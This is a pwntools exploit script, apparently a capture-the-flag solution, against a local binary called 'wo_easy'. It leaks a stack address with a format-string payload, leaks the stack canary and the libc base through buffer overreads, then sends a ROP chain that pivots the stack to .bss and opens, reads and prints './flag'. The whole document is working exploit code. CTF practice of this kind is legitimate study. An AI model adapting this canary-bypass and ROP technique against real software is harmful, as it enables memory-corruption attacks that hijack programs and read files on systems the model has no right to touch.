from pwn import *

r=process("./wo_easy")
gdb.attach(r)
context.log_level='debug'
pause()
r.recvuntil("Please login it!!!\nPlease input: ")
r.send("%4660c%7$n%7$p")
r.recvuntil(b'0x')

stack_add=int(r.recv(12),16)
print(hex(stack_add))

r.recvuntil(b">>")
r.sendline(b"1")
r.send(b'a'*103+b'b'*2)
r.recvuntil(b">>")
r.sendline(b"2")
r.recvuntil(b'abb')

canary=u64(r.recv(7).rjust(8,b'\x00'))
print(hex(canary))

r.recvuntil(b">>")
r.sendline(b"1")
r.send(b'a'*119+b'b')
r.recvuntil(b">>")
r.sendline(b"2")
r.recvuntil(b'ab')
libc_base=u64(r.recv(6).ljust(8,b'\x00'))-0x29D90
print(hex(libc_base))


libc=ELF("./libc.so.6")
rdi_add=0x401653
rsi_add=0x2be51+libc_base
rdxr12_add=0x11f497+libc_base
puts_plt=0x4010C0
pay=b"a".ljust(104,b'a')

bss_add=0x404200
learet_add=0x401331
read_plt=0x401100
pay+=p64(canary)+p64(0x404200)+p64(rdi_add)+p64(0)+p64(rsi_add)+p64(bss_add)+p64(rdxr12_add)+p64(0x200)+p64(0)+p64(read_plt)+p64(learet_add)

print(len(pay))

r.recvuntil(b">>")
r.sendline(b"1")
r.send(pay)

r.recvuntil(b">>")
pause()
r.sendline(b"3")
pay2=b'./flag\x00\x00'+p64(rdi_add)+p64(bss_add)+p64(rsi_add)+p64(0)+p64(libc_base+libc.sym["open"])+p64(rdi_add)+p64(3)+p64(rsi_add)+p64(bss_add+0x100)+p64(rdxr12_add)+p64(50)+p64(0)+p64(read_plt)+p64(rdi_add)+p64(bss_add+0x100)+p64(puts_plt)
r.send(pay2)


r.interactive()

